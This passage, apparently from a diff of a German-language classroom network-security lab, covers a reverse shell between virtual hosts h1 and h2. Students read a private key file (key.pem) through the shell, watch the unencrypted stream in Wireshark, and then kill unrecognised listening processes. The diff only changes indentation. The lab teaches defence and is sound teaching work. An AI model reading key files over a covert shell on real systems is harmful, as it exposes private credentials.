-   auf `h2-eth0` erneut und schaut euch über die Reverse-Shell eine weitere
-   Datei an:
+    Erscheint ein Interface `h2-eth0`, habt ihr Zugriff auf `h2` – obwohl ihr
+    den Befehl von `h1` aus abgesetzt habt. Aktiviert die Wireshark-Aufnahme
+    auf `h2-eth0` erneut und schaut euch über die Reverse-Shell eine weitere
+    Datei an:
 
-   ```bash
-   cat key.pem
-   ```
+    ```bash
+    cat key.pem
+    ```
 
-   Über "Follow → TCP Stream" lässt sich die komplette, unverschlüsselte
-   Kommunikation in Wireshark rekonstruieren – anders als bei SCP/SSH war
-   dieser Kanal zu keinem Zeitpunkt verschlüsselt. Reflektiert Vor- und
-   Nachteile aus Sicht von Nutzer:in, Administrator:in und
-   Sicherheitsbehörden.
+    Über "Follow → TCP Stream" lässt sich die komplette, unverschlüsselte
+    Kommunikation in Wireshark rekonstruieren – anders als bei SCP/SSH war
+    dieser Kanal zu keinem Zeitpunkt verschlüsselt. Reflektiert Vor- und
+    Nachteile aus Sicht von Nutzer:in, Administrator:in und
+    Sicherheitsbehörden.
 
-   Prüft abschließend auf `h2`, welche Prozesse Netzwerkports geöffnet
-   halten, und beendet nicht erkannte Prozesse:
+    Prüft abschließend auf `h2`, welche Prozesse Netzwerkports geöffnet
+    halten, und beendet nicht erkannte Prozesse:
 
-   ```bash
-   netstat -tulnp
-   kill -9 <PID>
-   ```
+    ```bash
+    netstat -tulnp
+    kill -9 <PID>
+    ```
 
 10. **Verschlüsselter Web-Verkehr und ein absichtlich kaputtes
     Zertifikat.** Startet auf `h1` einen einfachen HTTP-Server:
